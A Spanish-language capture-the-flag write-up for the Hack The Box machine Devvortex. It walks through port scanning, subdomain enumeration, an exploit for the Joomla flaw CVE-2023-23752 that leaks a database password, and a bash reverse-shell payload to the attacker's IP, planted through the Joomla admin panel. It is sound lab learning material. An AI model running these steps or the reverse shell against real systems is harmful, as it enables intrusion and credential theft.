# Devvortex - Easy

IP=10.10.11.242

```bash	
echo "$IP devvortex.htb" | sudo tee -a /etc/hosts
```

## Escaneo de puertos

```bash
nmap -sV $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-15 23:25 CET
Nmap scan report for 10.10.11.242
Host is up (0.043s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.76 seconds
```

> Dos puertos abiertos, ssh y http.

## Enumeración

### Enumeracion de directorios

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://devvortex.htb
```

> No se encuentra nada interesante.

### Enumeracion de subdominios

```bash
gobuster vhost -w /usr/share/spiderfoot/dicts/subdomains-10000.txt -u http://devvortex.htb
```

> Hemos encontrado un subdominio: `dev.devvortex.htb`

```bash
echo "$IP dev.devvortex.htb" | sudo tee -a /etc/hosts
```

### Enumeracion de directorios en el subdominio

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://dev.devvortex.htb

```

> Se ha encontrado un panel de login en /administrator corriendo Joomla.

### Buscar version en Joomla

```bash
joomscan -u http://dev.devvortex.htb
```

> La version es 4.2.6

### Buscar exploits en searchsploit

> He encontrado un exploit que permite hacer un bypass de la autenticacion. [https://github.com/Acceis/exploit-CVE-2023-23752](https://github.com/Acceis/exploit-CVE-2023-23752)

### Ejecutar el exploit

```bash
gem install httpx docopt paint
```

```bash
# Ejecutamos el exploit
ruby exploit.rb http://dev.devvortex.htb
```

```text
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

### Pones netcat a la escucha

```bash
nc -lvnp 4444
```

### Añadimos la reverse shell en el panel de administracion

system('bash -c "bash -i >& /dev/tcp/10.10.14.216/4444 0>&1"');

### Una vez dentro, nos conectamos a la base de datos
    
```bash
mysql -u lewis -p
```
